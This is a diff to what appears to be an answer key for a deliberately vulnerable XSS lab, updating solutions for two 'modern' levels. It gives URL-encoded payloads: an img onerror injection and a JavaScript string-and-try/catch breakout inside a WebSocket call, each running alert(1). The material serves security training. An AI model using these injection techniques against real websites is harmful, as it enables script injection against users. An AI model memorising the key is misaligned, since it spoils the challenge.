@@ -11,10 +11,10 @@ Modern framework / SaaS XSS shapes: dangerouslySetInnerHTML, markdown, hydration
 
 ### modern-level2
 
-`/modern/level2/?query=%5Bx%5D(javascript:alert(1))`
+`/modern/level2/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `[x](javascript:alert(1))`
-- context: markdown link href no scheme check
+- payload: `<img src=x onerror=alert(1)>`
+- context: markdown link text reflected raw; a `)` ends the href, so inject HTML directly
 
 ### modern-level3
 
@@ -39,7 +39,7 @@ Modern framework / SaaS XSS shapes: dangerouslySetInnerHTML, markdown, hydration
 
 ### modern-level6
 
-`/modern/level6/?wsurl=x%27);alert(1);//`
+`/modern/level6/?wsurl=x');%7Dcatch(e)%7B%7Dalert(1);try%7Bnew%20WebSocket('x`
 
-- payload: `x');alert(1);//`
-- context: wsurl interpolated unescaped into JS string `new WebSocket('...')`
+- payload: `x');}catch(e){}alert(1);try{new WebSocket('x`
+- context: inside new WebSocket('...') in a try; close the call and the try/catch, then run
